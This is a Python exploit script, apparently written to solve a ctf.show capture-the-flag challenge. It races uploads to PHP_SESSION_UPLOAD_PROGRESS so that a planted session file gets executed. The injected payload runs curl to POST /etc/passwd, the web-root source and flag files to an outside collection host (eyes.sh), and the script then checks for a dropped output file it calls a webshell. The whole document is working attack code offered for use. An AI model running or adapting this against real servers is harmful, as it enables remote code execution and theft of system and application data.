import requests
import threading
import time
import signal
import sys

url = 'http://5fedc0ec-b7a0-4b29-b0f0-ffb5f6b3adf8.challenge.ctf.show/'
shell_url = url + "44.txt"
sessionid = 'cnmusa'

data = {
    'PHP_SESSION_UPLOAD_PROGRESS': 'ls > 44.txt;curl -X POST http://219tzymz.eyes.sh -d "1=`cat /etc/passwd;cat /var/www/html/*;cat /f*`"',
}

file = {
    'file': sessionid
}

cookies = {
    'PHPSESSID': sessionid
}

# 常见 session 文件路径列表
# session_paths = [
#     f"/var/lib/php/sess_{sessionid}",
#     f"/var/lib/php/sessions/sess_{sessionid}",
#     f"/tmp/sess_{sessionid}",
#     f"/tmp/sessions/sess_{sessionid}"
# ]
str_len = len(sessionid)
payload = "?"*str_len
session_paths = [
    f". /???/???/???/????_{payload}",
    f". /???/???/???/????????/????_{payload}",
    f". /???/????_{payload}",
    f". /???/????????/????_{payload}"
]

# 全局停止事件
stop_event = threading.Event()

def upload_file():
    while not stop_event.is_set():
        try:
            requests.post(url, data=data, files=file, cookies=cookies, timeout=3)
        except requests.RequestException:
            pass
        # time.sleep(1)

def check_file():
    while not stop_event.is_set():
        try:
            # 尝试所有常见 session 文件路径
            for path in session_paths:
                print(f"Trying path: {path}")
                requests.post(url, data={"code": path}, timeout=3)

            r = requests.get(shell_url, timeout=3)
            if r.status_code == 200:
                print('Webshell created successfully')
                print(r.text)
                stop_event.set()  # 文件创建成功，通知所有线程退出
                break
            else:
                print(f"{r.status_code}")
        except requests.RequestException:
            pass
        # time.sleep(1)

# Ctrl+C 捕获处理
def signal_handler(sig, frame):
    print("\nCtrl+C 捕获，正在退出...")
    stop_event.set()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# 启动线程
threads = []
for _ in range(5):
    t = threading.Thread(target=upload_file, daemon=True)
    t.start()
    threads.append(t)

for _ in range(15):
    t = threading.Thread(target=check_file, daemon=True)
    t.start()
    threads.append(t)

# 主线程等待事件
try:
    while not stop_event.is_set():
        time.sleep(0.5)
except KeyboardInterrupt:
    stop_event.set()

for t in threads:
    t.join()
